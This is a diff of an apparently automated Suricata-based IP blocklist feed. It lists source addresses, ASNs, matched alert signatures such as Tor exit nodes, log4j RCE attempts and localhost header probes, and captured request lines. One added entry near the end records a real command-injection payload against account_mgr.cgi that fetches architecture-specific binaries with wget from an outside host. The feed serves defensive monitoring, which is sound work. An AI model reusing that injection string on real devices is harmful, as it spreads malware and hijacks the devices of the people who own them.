@@ -1,226 +1,13 @@
 {
-  "generated_at": "2026-11-27T13:00:00Z",
+  "generated_at": "2026-11-28T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 107,
-    "v4": 100,
-    "v6": 7
+    "total": 105,
+    "v4": 97,
+    "v6": 8
   },
   "items": [
-    {
-      "ip": "204.228.141.31",
-      "family": "v4",
-      "first_seen": "2026-11-20T23:00:00Z",
-      "last_seen": "2026-11-20T23:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "6315",
-      "asn_name": "XMISSION - XMission, L.C.",
-      "asn_prefix": "204.228.128.0/19",
-      "payloads": [
-        "GET /identity"
-      ]
-    },
-    {
-      "ip": "192.42.116.50",
-      "family": "v4",
-      "first_seen": "2026-11-20T21:00:00Z",
-      "last_seen": "2026-11-20T21:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 56"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "215125",
-      "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "171.25.193.45",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 19"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "198093",
-      "asn_name": "DFRI-AS Foreningen for digitala fri- och rattigheter",
-      "asn_prefix": "171.25.193.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "195.47.238.50",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 63"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "30893",
-      "asn_name": "NOACKHOSTING-AS No ACK Group Holding AB",
-      "asn_prefix": "195.47.238.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "192.42.116.65",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 57"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "215125",
-      "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "185.220.101.101",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 31"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "60729",
-      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "45.13.225.69",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 106"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "58087",
-      "asn_name": "FlorianKolb Florian Kolb",
-      "asn_prefix": "45.13.225.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "185.220.101.2",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 39"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "60729",
-      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "185.129.61.10",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 25"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "210731",
-      "asn_name": "DOTSRC Forening for DotSrc",
-      "asn_prefix": "185.129.61.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "192.42.116.113",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 53"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "215125",
-      "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "185.220.100.242",
-      "family": "v4",
-      "first_seen": "2026-11-20T18:00:00Z",
-      "last_seen": "2026-11-20T18:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 30"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "205100",
-      "asn_name": "F3NETZE F3 Netze e.V.",
-      "asn_prefix": "185.220.100.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "89.222.96.216",
-      "family": "v4",
-      "first_seen": "2026-11-20T23:00:00Z",
-      "last_seen": "2026-11-20T23:00:00Z",
-      "scenarios": [
-        "suricata/ET EXPLOIT Possible Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (Outbound) (CVE-2021-44228)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "212238",
-      "asn_name": "CDNEXT Datacamp Limited",
-      "asn_prefix": "89.222.96.0/23"
-    },
     {
       "ip": "20.12.242.90",
       "family": "v4",
@@ -1523,6 +1310,7 @@
         "suricata"
       ],
       "asn": "13977",
+      "asn_name": "CTELCO - Fidium",
       "asn_prefix": "71.181.104.0/22",
       "payloads": [
         "GET /identity"
@@ -1586,7 +1374,7 @@
       "ip": "65.22.160.17",
       "family": "v4",
       "first_seen": "2026-11-27T07:00:00Z",
-      "last_seen": "2026-11-27T09:00:00Z",
+      "last_seen": "2026-11-27T18:00:00Z",
       "scenarios": [
         "suricata/ET TA_ABUSED_SERVICES Commonly Actor Abused Online Service Domain (storjshare .io)"
       ],
@@ -1694,7 +1482,7 @@
       "ip": "2600:9000:5300:1600:0000:0000:0000:0001",
       "family": "v6",
       "first_seen": "2026-11-27T08:00:00Z",
-      "last_seen": "2026-11-27T08:00:00Z",
+      "last_seen": "2026-11-27T18:00:00Z",
       "scenarios": [
         "suricata/ET TA_ABUSED_SERVICES Commonly Actor Abused Online Service Domain (storjshare .io)"
       ],
@@ -1712,7 +1500,7 @@
       "ip": "2600:9000:5306:2200:0000:0000:0000:0001",
       "family": "v6",
       "first_seen": "2026-11-27T08:00:00Z",
-      "last_seen": "2026-11-27T08:00:00Z",
+      "last_seen": "2026-11-27T18:00:00Z",
       "scenarios": [
         "suricata/ET TA_ABUSED_SERVICES Commonly Actor Abused Online Service Domain (storjshare .io)"
       ],
@@ -1730,7 +1518,7 @@
       "ip": "205.251.192.22",
       "family": "v4",
       "first_seen": "2026-11-27T08:00:00Z",
-      "last_seen": "2026-11-27T08:00:00Z",
+      "last_seen": "2026-11-27T18:00:00Z",
       "scenarios": [
         "suricata/ET TA_ABUSED_SERVICES Commonly Actor Abused Online Service Domain (storjshare .io)"
       ],
@@ -1822,6 +1610,7 @@
         "suricata"
       ],
       "asn": "12322",
+      "asn_name": "PROXAD Free SAS",
       "asn_prefix": "82.64.0.0/14",
       "payloads": [
         "GET /identity"
@@ -1976,6 +1765,183 @@
       "asn": "12041",
       "asn_name": "AS-AFILIAS1 - Afilias, Inc.",
       "asn_prefix": "65.22.162.0/24"
+    },
+    {
+      "ip": "50.126.206.166",
+      "family": "v4",
+      "first_seen": "2026-11-28T00:00:00Z",
+      "last_seen": "2026-11-28T00:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "5650",
+      "asn_name": "FRONTIER-FRTR - Frontier Communications of America, Inc.",
+      "asn_prefix": "50.126.192.0/18",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "96.240.131.247",
+      "family": "v4",
+      "first_seen": "2026-11-27T20:00:00Z",
+      "last_seen": "2026-11-27T20:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "701",
+      "asn_name": "UUNET - Verizon Business",
+      "asn_prefix": "96.240.128.0/20",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "71.174.80.46",
+      "family": "v4",
+      "first_seen": "2026-11-27T19:00:00Z",
+      "last_seen": "2026-11-27T19:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "701",
+      "asn_name": "UUNET - Verizon Business",
+      "asn_prefix": "71.174.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "123.51.36.91",
+      "family": "v4",
+      "first_seen": "2026-11-27T18:00:00Z",
+      "last_seen": "2026-11-27T18:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "38333",
+      "asn_name": "SYMBIO-AS-AU-AP - Symbio Networks",
+      "asn_prefix": "123.51.0.0/17",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "77.77.43.215",
+      "family": "v4",
+      "first_seen": "2026-11-27T13:00:00Z",
+      "last_seen": "2026-11-27T13:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "39184",
+      "asn_name": "UltraNET-AS UltraNET Ltd",
+      "asn_prefix": "77.77.43.0/24"
+    },
+    {
+      "ip": "193.165.116.86",
+      "family": "v4",
+      "first_seen": "2026-11-27T13:00:00Z",
+      "last_seen": "2026-11-27T13:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "30764",
+      "asn_name": "PODA-AS PODA a.s.",
+      "asn_prefix": "193.165.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "40.124.113.127",
+      "family": "v4",
+      "first_seen": "2026-11-27T13:00:00Z",
+      "last_seen": "2026-11-27T13:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "40.124.0.0/16",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "2a01:8840:009f:0000:0000:0000:0000:0017",
+      "family": "v6",
+      "first_seen": "2026-11-27T13:00:00Z",
+      "last_seen": "2026-11-27T13:00:00Z",
+      "scenarios": [
+        "suricata/ET TA_ABUSED_SERVICES Commonly Actor Abused Online Service Domain (storjshare .io)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "12041",
+      "asn_name": "AS-AFILIAS1 - Afilias, Inc.",
+      "asn_prefix": "2a01:8840:9f::/48"
+    },
+    {
+      "ip": "23.122.170.139",
+      "family": "v4",
+      "first_seen": "2026-11-27T13:00:00Z",
+      "last_seen": "2026-11-27T13:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "7018",
+      "asn_name": "ATT-INTERNET4 - AT&T Enterprises, LLC",
+      "asn_prefix": "23.112.0.0/12",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "160.119.71.193",
+      "family": "v4",
+      "first_seen": "2026-11-28T00:00:00Z",
+      "last_seen": "2026-11-28T00:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "49870",
+      "asn_name": "AS49870-BV Alsycon B.V.",
+      "asn_prefix": "160.119.71.0/24",
+      "payloads": [
+        "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27%3Bid%3B%28cd%20%2Ftmp%3BA%3D%24%28uname%20-m%29%3Bcase%20%22%24A%22%20in%20armv4%2A%7Carmv5%2A%29B%3Darm%3B%3Barmv6%2A%29B%3Darm6%3B%3Barmv7%2A%7Caarch64%2A%29B%3Darm7%3B%3Bmipsel%2A%29B%3Dmpsl%3B%3Bmips%2A%29B%3Dmips%3B%3Bx86_64%2A%29B%3Dx86_64%3B%3Bi%5B3-5%5D86%2A%29B%3Di486%3B%3Bi%5B6-9%5D86%2A%29B%3Di686%3B%3Bppc%2A%29B%3Dppc%3B%3Bsh4%2A%29B%3Dsh4%3B%3Bm68k%2A%29B%3Dm68k%3B%3B%2A%29B%3Darm%3B%3Besac%3Bwget%20-q%20http%3A%2F%2F160.119.66.206%2Fbins%\u2026"
+      ]
     }
   ]
 }
